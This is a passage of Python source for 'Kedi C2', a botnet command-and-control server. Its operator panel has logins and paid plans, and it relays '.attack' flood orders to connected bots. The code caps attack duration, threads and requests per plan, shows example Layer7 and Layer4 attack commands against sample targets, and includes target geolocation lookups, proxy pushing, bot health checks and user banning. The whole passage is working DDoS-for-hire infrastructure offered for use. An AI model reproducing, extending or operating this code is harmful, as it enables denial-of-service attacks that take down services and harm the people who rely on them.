\r{LIGHTYELLOW} City   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{city}{LIGHTYELLOW} ]
\r{LIGHTYELLOW} Tool   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTRED}Kedi{LIGHTGREEN}-{LIGHTCYAN}C2{LIGHTYELLOW} ]
\r{LIGHTCYAN}╚══════════════════════════════════════════════════════════════════╝\n
"""
    conn.send(isp_banner.encode())

def monitor_file():
    if not path.isfile(file_path):
        with open(file_path, 'w'):
            pass
    last_position = path.getsize(file_path) 
    while True:
        try:
            with open(file_path, 'r') as file:
                file.seek(last_position)
                new_content = file.read() 
                if new_content:
                    last_position = file.tell() 
                sleep(1)
        except Exception as e:
            pass

def load_attacks():
    if path.exists(file_path):
        with open(file_path , 'r') as file:
            try:
                return load(file)
            except:
                return {}
    return {}

def save_attacks(attacks):
    with open(file_path , 'a') as file:
        dump(attacks, file)

i = 0

def app(conn , addr):
    try:
        conn.send("\033c".encode())
        conn.send(banne.encode())
        conn.send(f"\033]0; / Kedi C2 - Powerfull C2/Botnet - Please login to run the program - {datetime.now().date()} \\\007".encode())
        conn.send(f"\r{LIGHTGREEN}  Welcome {LIGHTRED}- {LIGHTCYAN}Please login to run the program {LIGHTRED}- {LIGHTWHITE}THX\n".encode())
        def monitor_file(file_path='src/users.json'):
            if not path.isfile(file_path):
                with open(file_path , 'a'):
                    pass
            last_position = path.getsize(file_path) 
            while True:
                try:
                    with open(file_path , 'r') as file:
                        file.seek(last_position)
                        new_content = file.read() 
                        if new_content:
                            last_position = file.tell() 
                        sleep(0.5)
                except:
                    pass
        def is_user_banned(uname , ban_file='src/ban.json'):
            banned_users = load_files(ban_file)
            return uname in banned_users
        def passwd():
            while True:
                conn.send(f"\r  {LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}]{LIGHTGREEN} Password {LIGHTRED}:\x1b[0;38;2;0;0;0m ".encode())
                passw = conn.recv(1024).decode('cp1252').strip()
                pslis = [details.get('password', 'N/A') for id, details in data.items()]
                if passw in pslis:
                    return passw
                else:
                    pass
        user = ''
        while True:
            conn.send(f"\r  {LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}]{LIGHTGREEN} Username {LIGHTRED}:{LIGHTCYAN} ".encode())
            user = conn.recv(1024).decode("cp1252").strip()
            with open('src/users.json' , 'r') as file:
                data = load(file)
            urlis = [details.get('user', 'N/A') for id, details in data.items()]
            if user in urlis:
                break
        passwd()  
        def get_online_users():
            online_usernames = []
            for conn in online_users:
                username = getattr(conn, 'user', None)
                if username:
                    online_usernames.append(username)
            return online_usernames
        plan = next((details.get("plan", "N/A") for id, details in data.items() if details.get("user") == user), None)
        conn.send(banner_xd.encode())
        if user != 'kediam':
            online_users.append(conn)
        if user == "kediam":
            kedis.append(conn)
        else:
            pass
        if user != "kediam":
            print(f'\n  {red}[{yellow}+{red}] {green}Client Connected {LIGHTMAGENTA}( {LIGHTCYAN}{user}{LIGHTMAGENTA} ) {red}: {blue}kedis {red}: {yellow}{len(kedis)}')
        if is_user_banned(user):
            conn.send(f"\r\n\t{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}]{LIGHTGREEN} You Are Banned".encode())
            conn.close()
            online_users.remove(conn)
        conn.send(f"\033]0; / Kedi C2 - Powerfull C2/Botnet - By Exploit - Bots : {len(kedis)} - User : {user} - Online : {len(online_users)} - Plan : {plan} - {datetime.now().date()} \\\007".encode())
        def checker():
            try:
                while 1:
                    dead_bots = []
                    for bot in kedis:
                        try:
                            bot.settimeout(5)
                            bot.send(b'[+]ping')
                            if bot.recv(1024).decode() != '[+]pong':
                                dead_bots.append(bot)
                        except:
                            pass
                    for bot in dead_bots:
                        bot.close()
                        kedis.remove(bot) 
                    conn.send(f"\033]0; [/] / Kedi C2 - Powerfull C2/Botnet - By Exploit - Bots : {len(kedis)} - User : {user} - Online : {len(online_users)} - Plan : {plan} - {datetime.now().date()} \\\007".encode())
                    sleep(1)
                    conn.send(f"\033]0; [-] / Kedi C2 - Powerfull C2/Botnet - By Exploit - Bots : {len(kedis)} - User : {user} - Online : {len(online_users)} - Plan : {plan} - {datetime.now().date()} \\\007".encode())
                    sleep(1)
                    conn.send(f"\033]0; [\] / Kedi C2 - Powerfull C2/Botnet - By Exploit - Bots : {len(kedis)} - User : {user} - Online : {len(online_users)} - Plan : {plan} - {datetime.now().date()} \\\007".encode())
                    sleep(1)
                    conn.send(f"\033]0; [|] / Kedi C2 - Powerfull C2/Botnet - By Exploit - Bots : {len(kedis)} - User : {user} - Online : {len(online_users)} - Plan : {plan} - {datetime.now().date()} \\\007".encode())
                    sleep(1)
            except:
                pass
        thr(target=checker).start()
        try:
            while True:
                try:
                    conn.send(f"\r\033\33[100m {LIGHTWHITE}✧ {user} • KediC2 ✧ \033[0;0m ►►\x1b[38;5;27m ".encode())
                    data = conn.recv(1024).decode()
                    conn.send(f"\033]0; / Kedi C2 - Powerfull C2/Botnet - By Exploit - Bots : {len(kedis)} - User : {user} - Online : {len(online_users)} - Plan : {plan} - {datetime.now().date()} \\\007".encode())
                    bots = f"""

\r\t{LIGHTYELLOW}╔══════════════════════════════════════════════════════════════════╗
\r
\r\t {LIGHTGREEN}   Bots {LIGHTRED}: {LIGHTMAGENTA}{len(kedis)}
\r\t {LIGHTGREEN}   C2/Botnet {LIGHTRED}: {LIGHTMAGENTA}Kedi C2/Botnet
\r
\r\t{LIGHTYELLOW}╚══════════════════════════════════════════════════════════════════╝\n
"""
                    if data.split()[0] == '.attack':
                        try:
                            method = str(data.split()[1])
                            t4rget = str(data.split()[2])
                            p0rt = int(data.split()[3])
                            thr34d = int(data.split()[4])
                            rpc = int(data.split()[5])
                            tim3 = int(data.split()[6])
                            max_time = 0
                            if plan == "KEDI":
                                max_time = 60
                                max_thread = 20
                                max_rpc = 128
                            elif plan == "VIP":
                                max_time = 120
                                max_thread = 50
                                max_rpc = 500
                            elif plan == "OWNER":
                                max_time = 180
                                max_thread = 1000
                                max_rpc = 1500
                            if tim3 > max_time:
                                conn.send(f"\r\n{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTGREEN}Your plan ({plan}) allows a maximum time of {max_time} seconds :))\n".encode())
                                continue
                            if thr34d > max_thread:
                                conn.send(f"\r\n{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTGREEN}Your plan ({plan}) allows a maximum thread of {max_thread} :))\n".encode())
                                continue
                            if rpc > max_rpc:
                                conn.send(f"\r\n{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTGREEN}Your plan ({plan}) allows a maximum rpc of {max_rpc} :))\n".encode())
                                continue
                            parsed_url = urlparse(t4rget)
                            target = parsed_url.netloc
                            now = datetime.now()
                            current_datetime = datetime.now()
                            date = current_datetime.date()
                            timee = now.strftime('%H:%M:%S')
                            response = get(f"http://ip-api.com/json/{target}")
                            response.raise_for_status()
                            dat = response.json()
                            isp = dat['as']
                            city = dat['city']
                            zone = dat['timezone']
                            def att():
                                try:
                                    global i
                                    i += 1
                                    attack_json = {
                                        i: {
                                            "method": method,
                                            "url": t4rget,
                                            "port": p0rt,
                                            "time": tim3,
                                            "attime": time(),
                                            "user": user
                                        }
                                    }
                                    attacks = load_attacks()
                                    attacks.update(attack_json)
                                    save_attacks(attacks)
                                except Exception as e:
                                    print(e)
                            def rmon():
                                while True:
                                    try:
                                        sleep(5)
                                        attacks = load_attacks()
                                        current_time = time()
                                        for attack_id in list(attacks.keys()):
                                            if current_time - attacks[attack_id]['attime'] > tim3:
                                                del attacks[attack_id]
                                        save_attacks(attacks)
                                    except Exception as e:
                                        print(f"Error in rmon: {e}")
                            thr(target=monitor_file , daemon=True).start()
                            thr(target=rmon , daemon=True).start()
                            thr(target=att , daemon=True).start()
                        except:
                            pass
                        try:
                            data = data.replace(".attack" , "!att")
                            attack_banner = f"""\033c
\r{RESET}██████▓▓████░▒░   ░░       ░ ░▒░░░░░░ ░░▒▒███████{LIGHTWHITE}  Status   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}𝙰𝚝𝚝𝚊𝚌𝚔 𝚂𝚝𝚊𝚛𝚝𝚎𝚍 𝚂𝚎𝚌𝚌𝚎𝚜𝚏𝚞𝚕 {LIGHTYELLOW}]
\r{RESET}█████████▓█▓██▓▒ ░░░ ░░▓████░ ░▒░░░░░   ▒░███████{LIGHTWHITE}   Method  {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTPINK}{method} {LIGHTYELLOW}]
\r{RESET}██████▓█▓▓█▓▒░░░░    ░░░░░░░░░░░░░░░░  ░▒▒▒█▓████{LIGHTWHITE}   Target  {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTCYAN}{t4rget} {LIGHTYELLOW}]
\r{RESET}████████▓█▓ ▒▓▒▒▓█  ░░░░▒▓▓█░░▒▒░░░░░    ░░▓▓████{LIGHTWHITE}   Port    {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTRED}{p0rt} {LIGHTYELLOW}]
\r{RESET}█████░██▓█▓▒▓▓██▒█░░░▓▒█ ███▒▒▒▒░▒▒░░░  ░▒▒▒▒▒███{LIGHTWHITE}   Thread  {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTBLUE}{thr34d} {LIGHTYELLOW}]
\r{RESET}█████▓████████▓▒▒█░▒░▒▒▓▓▓█▓▓▓▒▒▒░░▒░░▒▒░░▒▒░▒███{LIGHTWHITE}   Rpc     {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTWHITE}{rpc} {LIGHTYELLOW}]
\r{RESET}██████████▒▓░░▒░█▒▒▒▒▒▒░▒░░░▒▒▒░▒▒▒▒▒▒▓░░░█▒░░▒▒█{LIGHTWHITE}   Time    {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTBLSYN}{tim3} {LIGHTYELLOW}]
\r{RESET}███████▓██░░░░░█▒░░░▓▒░░░░░ ░░░▒▒▓▒▓██░ ▒█░▓  ▒░▒{LIGHTWHITE}
\r{RESET}██████████░░░ ░█░ ░░▒░▒░░░░░░░░░▒▒▒▓█░  ▒ ░░░░░  {LIGHTWHITE}  Info     {LIGHTRED}: {LIGHTYELLOW}[{LIGHTGREEN} 𝙸𝚗𝚏𝚘 𝙰𝚌𝚚𝚞𝚒𝚜𝚒𝚝𝚒𝚘𝚗 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕 {LIGHTYELLOW}]
\r{RESET}██████████▓▒  ▒▒██▒░░▒░░░▒░░░░░░▒▒▓▒▓ ░▒░░▒░  ░█▒{LIGHTWHITE}   Date    {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTPINK}{date} {LIGHTYELLOW}]
\r{RESET}██████████▒▓▒░░░ ░░  ░░░░░░░░░░ ▒▒▒▒░░▒▓█░░░█░▓██{LIGHTWHITE}   Isp     {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTCYAN}{isp} {LIGHTYELLOW}]
\r{RESET}██████████▒▒▓▓▒░▒▒▒░░▒▒░▒▒░     ▒░ ▒█████████████{LIGHTWHITE}   Zone    {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTRED}{zone} {LIGHTYELLOW}]
\r{RESET}████████████░ ▓█▓▒▒░  ▒██░░░    ▓ ███████████████{LIGHTWHITE}   City    {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTBLUE}{city}{LIGHTYELLOW} ]
\r{RESET}███████████▓█  █ ░░░▒ █▒░ ░ ░░ ░ ████████████████{LIGHTWHITE}   User    {LIGHTRED}: {LIGHTYELLOW}[{LIGHTWHITE} {user} {LIGHTYELLOW}]
\r{RESET}████████████▓▓ █  ░▒░▓▓░       ████████████████▒▓{LIGHTWHITE}   Tool    {LIGHTRED}: {LIGHTYELLOW}[{LIGHTBLSYN} 𝙺𝚎𝚍𝚒 𝙲2/𝙱𝚘𝚝𝚗𝚎𝚝 {LIGHTYELLOW}]
\r{RESET}█████████████▓░░█ ░▒░▒     ▒ █████████████████▓▒▓{LIGHTWHITE}
\r{RESET}████████████████░█▒▒      ░██████████████████▒▓▒▒{LIGHTWHITE}
\r{RESET}█████████████████▒░     ███████████████████▒░█▓▓█{RESET}\n

\r\t{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTAQUA}𝓟𝓵𝓮𝓪𝓼𝓮 𝓐𝓯𝓽𝓮𝓻 𝓐𝓽𝓽𝓪𝓬𝓴 𝓣𝔂𝓹𝓮 {LIGHTRED}'{LIGHTPURPLE}.{LIGHTGREEN}home{LIGHTRED}' {LIGHTAQUA}𝓕𝓸𝓻 𝓑𝓪𝓬𝓴 𝓣𝓸 𝓗𝓸𝓶𝓮 {LIGHTWHITE}| {LIGHTPURPLE}[ {LIGHTPINK}𝚃𝚘𝚡𝚒𝚌𝚗𝚎𝚝 𝙾𝚗 𝚃𝚘𝚙 {LIGHTPURPLE}]{LIGHTRED} . {RESET}\n
"""
                            for kedi in kedis:
                                kedi.send(data.encode())
                        except:
                            pass
                        conn.send(attack_banner.encode())
                        print(f"\n {red}[{yellow}+{red}] {green}Attack Started to {red}:{cyan} {data.split()[2]} {red}| {green}Method {red}:{cyan} {data.split()[1]} {red}|{green} Time {red}:{cyan} {data.split()[6]} {red}| {white}User {red}: {cyan}{user}")
                        thr(target=checker).start()
                    elif data.split()[0] == '!attack':
                        conn.send(f"\r{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTWHITE}Layer7 {LIGHTRED}& {LIGHTWHITE}Layer4 {LIGHTBLUE}Attack {LIGHTRED}: {LIGHTGREEN}.attack {LIGHTRED}<{LIGHTYELLOW}method{LIGHTRED}> {LIGHTRED}<{LIGHTYELLOW}target{LIGHTRED}> {LIGHTRED}<{LIGHTYELLOW}port{LIGHTRED}> {LIGHTRED}<{LIGHTYELLOW}threads{LIGHTRED}> {LIGHTRED}<{LIGHTYELLOW}method{LIGHTRED}> {LIGHTRED}<{LIGHTYELLOW}rpc{LIGHTRED}> {LIGHTRED}<{LIGHTYELLOW}time{LIGHTRED}> {LIGHTCYAN}.\n".encode())
                        conn.send(f"\r{LIGHTMAGENTA}[{LIGHTCYAN}#{LIGHTMAGENTA}] {LIGHTWHITE}Example Layer{LIGHTCYAN}7 {LIGHTRED}: {LIGHTGREEN}.attack {LIGHTBLUE}raw https://target.com/ 443 50 500 120\n".encode())
                        conn.send(f"\r{LIGHTMAGENTA}[{LIGHTCYAN}#{LIGHTMAGENTA}] {LIGHTWHITE}Example Layer{LIGHTCYAN}4 {LIGHTRED}: {LIGHTGREEN}.attack {LIGHTMAGENTA}pps 1.1.1.1 53 50 500 120\n".encode())
                        try:
                            conn.send(f"\033]0; / Kedi C2 - Powerfull C2/Botnet - By Exploit - Bots : {len(kedis)} - User : {user} - Online : {len(online_users)} - Plan : {plan} - {datetime.now().date()} \\\007".encode())
                            print(f"\n  {red}[{yellow}+{red}] {green}Banner Count bot sent secessful {red}& {white}User {red}: {cyan}{user}")
                        except Exception as e:
                            print(e)
                    elif data.split()[0] == '?plan':
                        if plan == "KEDI":
                            max_time = 60
                            max_thread = 20
                            max_rpc = 128
                        elif plan == "VIP":
                            max_time = 120
                            max_thread = 50
                            max_rpc = 500
                        elif plan == "OWNER":
                            max_time = 180
                            max_thread = 1000
                            max_rpc = 1500
                        banner_plan = f"""
\r{LIGHTCYAN}  ╔══════════════════════════════════════════════════════════════════╗
\r{LIGHTYELLOW}\t\t\t User   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{user}{LIGHTYELLOW} ]
\r{LIGHTYELLOW}\t\t\t Plan   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{plan}{LIGHTYELLOW} ]
\r{LIGHTYELLOW}\t\t\t Thread {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{max_thread} (max){LIGHTYELLOW} ]
\r{LIGHTYELLOW}\t\t\t Rpc    {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{max_rpc} (max){LIGHTYELLOW} ]
\r{LIGHTYELLOW}\t\t\t Time   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{max_time} (max){LIGHTYELLOW} ]
\r{LIGHTYELLOW}\t\t\t Tool   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTRED}Kedi{LIGHTGREEN}-{LIGHTCYAN}C2{LIGHTYELLOW} ]
\r{LIGHTCYAN}  ╚══════════════════════════════════════════════════════════════════╝\n
"""
                        conn.send(banner_plan.encode())
                    elif data.split()[0] == '.ongoing':
                        try:
                            with open(file_path, 'r') as file:
                                data = load(file)
                            for id , details in data.items():
                                method = details.get('method', 'N/A')
                                urll = details.get('url', 'N/A')
                                prt = details.get('port', 'N/A')
                                timm = details.get('time', 'N/A')
                                usr = details.get('user', 'N/A')
                                banr = f"""\r\t{LIGHTBLSYN}| {RESET}[{id}] {LIGHTGREEN}User {LIGHTRED}: {LIGHTPINK}{usr} {LIGHTRED}| {LIGHTGREEN}Method {LIGHTRED}: {LIGHTAQUA}{method} {LIGHTRED}| {LIGHTGREEN}Target {LIGHTRED}: {LIGHTYELLOW}{urll} | {LIGHTGREEN}Port {LIGHTRED}: {LIGHTWHITE}{prt} | {LIGHTGREEN}Time {LIGHTRED}: {LIGHTPURPLE}{timm} {LIGHTBLSYN}|"""
                                conn.send(banr.encode())
                        except:
                            pass
                    elif data.split()[0] == '.exit':
                        conn.close()
                        online_users.remove(conn)
                        print(f"\n{red}[{yellow}+{red}] {green}Client {cyan}{addr} {green}disconnected {yellow}& {white}User {red}: {cyan}{user}")
                    elif data.split()[0] == '.clear':
                        conn.send("\033c".encode())
                        print(f"\n  {red}[{yellow}+{red}] {green}Page Cleared {red}: {cyan}.clear {yellow}& {white}User {red}: {cyan}{user}")
                        conn.send(f"\033]0; / Kedi C2 - Powerfull C2/Botnet - By Exploit - Bots : {len(kedis)} - User : {user} - Online : {len(online_users)} - Plan : {plan} - {datetime.now().date()} \\\007".encode())
                    elif data.split()[0] == '.home':
                        conn.send("\033c".encode())
                        print(f"\n  {red}[{yellow}+{red}] {green}Backed to home page {red}: {cyan}.home {yellow}& {white}User {red}: {cyan}{user}")
                        conn.send(banner_xd.encode())
                        conn.send(f"\033]0; / Kedi C2 - Powerfull C2/Botnet - By Exploit - Bots : {len(kedis)} - User : {user} - Online : {len(online_users)} - Plan : {plan} - {datetime.now().date()} \\\007".encode())
                    elif data.split()[0] == '.tools':
                        conn.send(tools.encode())
                        print(f"\n  {red}[{yellow}+{red}] {green}Tools Banner Sent Secessfull {yellow}& {white}User {red}: {cyan}{user}")
                    elif data.split()[0] == '.bots':
                        conn.send(bots.encode())
                    elif data.split()[0] == '!methods':
                        try:
                            conn.send(methods.encode())
                            print(f"\n  {red}[{yellow}+{red}] {green}Layer7 & Layer4 Banner Sent Secessful {yellow}& {white}User {red}: {cyan}{user}")
                        except Exception as e:
                            print(e)
                    elif data.split()[0] == '\x00':
                        conn.send(b'\x00')
                    elif data.split()[0] == '!layer7':
                        try:
                            conn.send(layer7.encode())
                            print(f"\n  {red}[{yellow}+{red}] {green}Layer7 Banner Sent Secessful {yellow}& {white}User {red}: {cyan}{user}")
                        except Exception as e:
                            print(e)
                    elif data.split()[0] == '!layer4':
                        conn.send(layer4.encode())
                        print(f"\n  {red}[{yellow}+{red}] {green}Layer4 Banner Sent Secessful {yellow}& {white}User {red}: {cyan}{user}")
                    elif data.split()[0] == '!base64-ecd':
                        word = data.replace("!base64-ecd", "").strip()
                        encoded_word = b64encode(word.encode('utf-8'))
                        xd = encoded_word.decode('utf-8')
                        bn = f"""
                        \r{LIGHTYELLOW}     Encoded   {LIGHTRED}: {LIGHTGREEN}{xd}{RESET}\n
"""
                        conn.send(bn.encode())
                    elif data.split()[0] == '!base64-dcd':
                        word = data.replace("!base64-dcd", "").strip()  
                        decoded_bytes = b64decode(word)
                        xd = decoded_bytes.decode('utf-8')
                        bn = f"""
                        \r{LIGHTYELLOW}     Decoded   {LIGHTRED}: {LIGHTGREEN}{xd}{RESET}\n
"""
                    elif data.split()[0] == '.black':
                        if plan == 'OWNER':
                            uz = str(data.split()[1])
                            with open('blacklist.txt' , 'a') as file:
                                file.write(uz)
                        conn.send(bn.encode())
                    elif data.split()[0] == '.addproxy':
                        if plan == 'OWNER':
                            for kedi in kedis:
                                kedi.send(b"!proxy")
                            bn = f"""\r\n\t{LIGHTWHITE}[{LIGHTCYAN}#{LIGHTWHITE}] {LIGHTPURPLE}Proxy List Added {LIGHTGREEN}Secessful{RESET}\n
"""
                            conn.send(bn.encode())
                    elif data.split()[0] == '[+]ping':
                        conn.send(b'[+]pong')
                    elif data.split()[0] == '.onlines':
                        if plan == 'OWNER':
                            online_usernames = get_online_users()
                            print(online_usernames)
                    elif data.split()[0] == '!print':
                        try:
                            notes = data.replace("!print", "").strip()  
                            no_tes = text2Gen(notes)
                            bn_r = f"""
                        \r{RESET}     {LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTGREEN}Note   {LIGHTRED}: {LIGHTGREEN}{no_tes} {RESET}{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}]{RESET}\n
 """
                            conn.send(bn_r.encode())
                        except Exception as e:
                            print(e)
                    elif data.split()[0] == '.paping':
                        try:
                            target_ip = str(data.split()[1])
                            target_port = int(data.split()[2])
                            print(f"\n  {red}[{yellow}+{red}] {green}Pinging {red}: {blue}{target_ip}:{target_port} {yellow}& {white}User {red}: {cyan}{user}")
                            for _ in range(10):
                                try:
                                    start_time = time()
                                    client_socket = socket(AF_INET , SOCK_STREAM)
                                    client_socket.settimeout(5)
                                    client_socket.connect((target_ip , target_port))
                                    client_socket.close()
                                    end_time = time()
                                    response_time = (end_time - start_time) * 1000
                                    theping = f"\r{LIGHTCYAN}Connected {LIGHTWHITE}to {LIGHTRED}{target_ip}{LIGHTWHITE}: time={LIGHTYELLOW}{response_time:.2f}ms{LIGHTWHITE} protocol={LIGHTGREEN}TCP{LIGHTWHITE} port={LIGHTMAGENTA}{target_port}\n"
                                    conn.send(theping.encode())
                                except socket.timeout:
                                    timedout = f"\r{LIGHTRED}Connection timed out {LIGHTRED}{target_ip}{LIGHTWHITE}: time={LIGHTYELLOW}{response_time:.2f}ms{LIGHTWHITE} protocol={LIGHTGREEN}TCP{LIGHTWHITE} port={LIGHTMAGENTA}{target_port}\n"
                                    conn.send(timedout.encode())
                        except:
                            pass
                    elif data.split()[0] == '!t2u':
                        bonnr = f"""
\r\n\t{LIGHTRED}- {LIGHTGREEN}Enter Target {LIGHTPINK}& {LIGHTAQUA}Protocol {LIGHTRED}.
\r\t{LIGHTRED}- {LIGHTGREEN}Example {LIGHTPURPLE}https {LIGHTRED}: !{LIGHTWHITE}t2u {LIGHTYELLOW}google.com https
\r\t{LIGHTRED}- {LIGHTGREEN}Example {LIGHTPURPLE}http  {LIGHTRED}: !{LIGHTWHITE}t2u {LIGHTYELLOW}google.com http\n
"""
                        try:
                            x_D = data.split()[1]
                            ptcl = data.split()[2]
                            if ptcl == 'https':
                                conn.send(f"\r\n\t{LIGHTYELLOW}[{LIGHTRED}#{LIGHTYELLOW}] {LIGHTAQUA}Secessful | {LIGHTBLUE}https://{x_D}\n".encode())
                            else:
                                conn.send(f"\r\n\t{LIGHTYELLOW}[{LIGHTRED}#{LIGHTYELLOW}] {LIGHTAQUA}Secessful | {LIGHTBLUE}http://{x_D}\n".encode())
                        except:
                            conn.send(bonnr)
                    elif data.split()[0] == '!u2t':
                        bonnr = f"""
\r\n\t{LIGHTRED}- {LIGHTGREEN}Enter URL {LIGHTRED}.
\r\t{LIGHTRED}- {LIGHTGREEN}Example {LIGHTPURPLE}https {LIGHTRED}: !{LIGHTWHITE}t2u {LIGHTYELLOW}https://google.com
\r\t{LIGHTRED}- {LIGHTGREEN}Example {LIGHTPURPLE}http  {LIGHTRED}: !{LIGHTWHITE}t2u {LIGHTYELLOW}http://google.com\n
"""
                        try:
                            x_D = data.split()[1]
                            parsed_url = urlparse(x_D)
                            torgot = parsed_url.netloc
                            conn.send(f"\r\n\t{LIGHTYELLOW}[{LIGHTRED}#{LIGHTYELLOW}] {LIGHTAQUA}Secessful | {LIGHTBLUE}{torgot}\n".encode())
                        except:
                            conn.send(bonnr)

                    elif data.split()[0] == ".lookup":
                        try:
                            url = str(data.split()[1])
                            parsed_url = urlparse(url)
                            target = parsed_url.netloc
                            now = datetime.now()
                            current_datetime = datetime.now()
                            date = current_datetime.date()
                            timee = now.strftime('%H:%M:%S')
                            response = get(f"http://ip-api.com/json/{target}")
                            response.raise_for_status()
                            dat = response.json()
                            isp = dat['as']
                            city = dat['city']
                            zone = dat['timezone']
                            isp_banner = f"""
                        \r    {LIGHTCYAN}╔══════════════════════════════════════════════════════════════════╗
                        \r    {LIGHTYELLOW} Date   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{date}{LIGHTYELLOW} ]
                        \r    {LIGHTYELLOW} Time   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{timee}{LIGHTYELLOW} ]
                        \r    {LIGHTYELLOW} Isp    {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{isp}{LIGHTYELLOW} ]
                        \r    {LIGHTYELLOW} Zone   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{zone}{LIGHTYELLOW} ]
                        \r    {LIGHTYELLOW} City   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{city}{LIGHTYELLOW} ]
                        \r    {LIGHTYELLOW} Tool   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTRED}Kedi{LIGHTGREEN}-{LIGHTCYAN}C2{LIGHTYELLOW} ]
                        \r    {LIGHTCYAN}╚══════════════════════════════════════════════════════════════════╝\n
                        """
                            conn.send(isp_banner.encode())
                            print(f"\n  {red}[{yellow}+{red}] {green}Lookup {red}: {blue}{url} {yellow}& {white}User {red}: {cyan}{user}")
                        except:
                            pass
                    elif data.split()[0] == "!help":
                        conn.send(help.encode())
                        print(f"\n  {red}[{yellow}+{red}] {green}Help Banner Sent Secessful {yellow}& {white}User {red}: {cyan}{user}")
                    elif data.split()[0] == "help":
                        conn.send(help.encode())
                        print(f"\n  {red}[{yellow}+{red}] {green}Help Banner Sent Secessful {yellow}& {white}User {red}: {cyan}{user}")
                    elif data.split()[0] == "admin":
                        if plan == 'OWNER':
                            conn.send(help_admin.encode())
                            print(f"\n  {red}[{yellow}+{red}] {green}Admin Help Banner Sent Secessful {yellow}& {white}User {red}: {cyan}{user}")
                    elif data.split()[0] == ".admin":
                        if plan == 'OWNER':
                            conn.send(help_admin.encode())
                            print(f"\n  {red}[{yellow}+{red}] {green}Admin Help Banner Sent Secessful {yellow}& {white}User {red}: {cyan}{user}")
                    elif data.split()[0] == "helpme":
                        if plan == 'OWNER':
                            conn.send(help_admin.encode())
                            print(f"\n  {red}[{yellow}+{red}] {green}Admin Help Banner Sent Secessful {yellow}& {white}User {red}: {cyan}{user}")
                    elif data.split()[0] == ".helpme":
                        if plan == 'OWNER':
                            conn.send(help_admin.encode())
                            print(f"\n  {red}[{yellow}+{red}] {green}Admin Help Banner Sent Secessful {yellow}& {white}User {red}: {cyan}{user}")
                    elif data.split()[0] == '.adduser':
                        if plan == 'OWNER':
                            parts = data.split()
                            if len(parts) != 4:
                                conn.send(f"\r\n\t{LIGHTRED}[ERROR]{LIGHTCYAN} Usage: .adduser <username> <password> <plan>\n".encode())
                            else:
                                uname = parts[1]
                                pword = parts[2]
                                pla = parts[3]
                                user_json = {
                                    uname: {
                                        "user": uname,
                                        "password": pword,
                                        "plan": pla
                                    }
                                }
                                urs = load_files()
                                if any(details["user"] == uname for details in urs.values()):
                                    conn.send(f"\r\n\t{LIGHTRED}[ERROR]{LIGHTCYAN} User {uname} already exists.\n".encode())
                                else:
                                    new_key = str(len(urs) + 1)
                                    urs[new_key] = user_json[uname]
                                    save_files(urs)
                                    conn.send(f"\r\n\t{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTGREEN}New User Added Successfully: {uname}:{pword}:{pla}\n".encode())
                    elif data.split()[0] == '.deluser':
                        if plan == 'OWNER':
                            try:
                                uname = data.split()[1]
                                fpath = 'src/users.json'
                                users = load_files('src/users.json')
                                key_to_delete = None
                                for key , details in users.items():
                                    if details.get("user") == uname:
                                        key_to_delete = key
                                        break
                                if key_to_delete:
                                    del users[key_to_delete]
                                    save_files(users , fpath)
                                conn.send(f"\r\n\t{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTGREEN}User Deleted Successfully\n".encode())
                            except:
                                pass
                        else:
                            conn.send(f"\r\n\t{LIGHTRED}[ERROR]{LIGHTCYAN} Permission Denied: Only root can add users.\n".encode())
                    elif data.split()[0] == '.banuser':
                        if plan == 'OWNER':
                            try:
                                uname = data.split()[1]
                                ban_file = "src/ban.json"
                                banned_users = load_files(ban_file)
                                if isinstance(banned_users , dict):
                                    banned_users = list(banned_users.values())
                                if uname in banned_users:
                                    conn.send(f"\r\n\t{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTGREEN}Already Banned\n".encode())
                                else:
                                    banned_users.append(uname)
                                    save_files(banned_users, ban_file)
                                conn.send(f"\r\n\t{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTGREEN}Banned Successfully\n".encode())
                            except Exception as e:
                                print(e)
                    elif data.split()[0] == '.unban':
                        if plan == 'OWNER':
                            try:
                                uname = data.split()[1]
                                ban_file = 'src/ban.json'
                                banned_users = load_files(ban_file)
                                users = load_files('src/ban.json')
                                if isinstance(banned_users, dict):
                                    banned_users = list(banned_users.values())
                                if uname in banned_users:
